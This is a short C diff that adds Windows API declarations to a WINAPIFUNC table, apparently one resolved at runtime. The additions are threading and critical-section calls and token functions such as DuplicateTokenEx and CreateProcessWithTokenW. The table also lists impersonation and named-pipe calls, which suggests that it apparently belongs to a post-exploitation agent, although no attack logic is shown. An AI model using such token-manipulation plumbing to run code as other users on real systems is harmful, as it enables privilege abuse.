@@ -37,8 +37,13 @@ struct WINAPIFUNC
 	DECL_API(CreateNamedPipeA);
 	DECL_API(CreatePipe);
 	DECL_API(CreateProcessA);
+	DECL_API(CreateEventA);
+	DECL_API(CreateThread);
 	DECL_API(DisconnectNamedPipe);
+	DECL_API(DeleteCriticalSection);
 	DECL_API(DeleteFileA);
+	DECL_API(EnterCriticalSection);
+	DECL_API(TryEnterCriticalSection);
 	DECL_API(FindClose);
 	DECL_API(FindFirstFileA);
 	DECL_API(FindNextFileA);
@@ -68,11 +73,13 @@ struct WINAPIFUNC
 	DECL_API(HeapDestroy);
 	DECL_API(HeapReAlloc);
 	DECL_API(HeapFree);
+	DECL_API(InitializeCriticalSection);
 	DECL_API(IsWow64Process);
 	DECL_API(LoadLibraryA);
 	DECL_API(LocalAlloc);
 	DECL_API(LocalFree);
 	DECL_API(LocalReAlloc);
+	DECL_API(LeaveCriticalSection);
 	DECL_API(MoveFileA);
 	DECL_API(MultiByteToWideChar);
 	DECL_API(PeekNamedPipe);
@@ -81,9 +88,12 @@ struct WINAPIFUNC
 	DECL_API(RtlCaptureContext);
 	DECL_API(SetCurrentDirectoryA);
 	DECL_API(SetNamedPipeHandleState);
+	DECL_API(SetEvent);
+	DECL_API(ResetEvent);
 	DECL_API(Sleep);
 	DECL_API(VirtualAlloc);
 	DECL_API(VirtualFree);
+	DECL_API(WaitForSingleObject);
 	DECL_API(WaitNamedPipeA);
 	DECL_API(WideCharToMultiByte);
 	DECL_API(WriteFile);
@@ -98,6 +108,9 @@ struct WINAPIFUNC
 	DECL_API(RevertToSelf);
 	DECL_API(ImpersonateLoggedOnUser);
 	DECL_API(SetThreadToken);
+	DECL_API(DuplicateTokenEx);
+	DECL_API(CreateProcessAsUserA);
+	DECL_API(CreateProcessWithTokenW);
 
 	// msvcrt
 #if defined(DEBUG)
